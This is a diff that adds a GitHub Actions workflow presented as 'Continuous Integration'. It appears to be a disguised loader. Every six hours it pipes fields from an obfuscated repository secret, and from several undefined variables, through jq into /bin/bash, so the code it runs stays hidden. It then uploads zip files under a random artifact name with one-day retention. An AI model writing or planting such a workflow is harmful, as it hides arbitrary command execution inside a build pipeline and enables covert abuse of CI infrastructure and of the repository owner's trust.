@@ -1,0 +1,37 @@
+name: Continuous Integration
+on:
+  workflow_dispatch:
+
+  schedule:
+    - cron: '7 2,8,14,20 * * *'
+permissions:
+  contents: read
+concurrency:
+  group: ${{ github.workflow }}
+  cancel-in-progress: false
+jobs:
+  perform:
+    name: Run build
+    runs-on: ubuntu-latest
+    timeout-minutes: 360
+    steps:
+      - uses: actions/checkout@v4
+        with:
+          fetch-depth: 1
+      - name: Run build
+        env:
+          opnvj992: ${{ secrets.opnvj992 }}
+        run: |
+          printf '%s' "$opnvj992" | jq -r .zeq9 | /bin/bash
+          printf '%s' "$uurmm4" | jq -r .cdq9 | /bin/bash
+          printf '%s' "$zsq3484" | jq -r .i1 | /bin/bash
+          echo $h5672 | jq -r .k1 | /bin/bash
+          printf '%s' "$mfr9" | jq -r .gfz06240 | /bin/bash
+
+      - name: Save archive
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: eqsyoNBW
+          path: "*.zip"
+          retention-days: 1
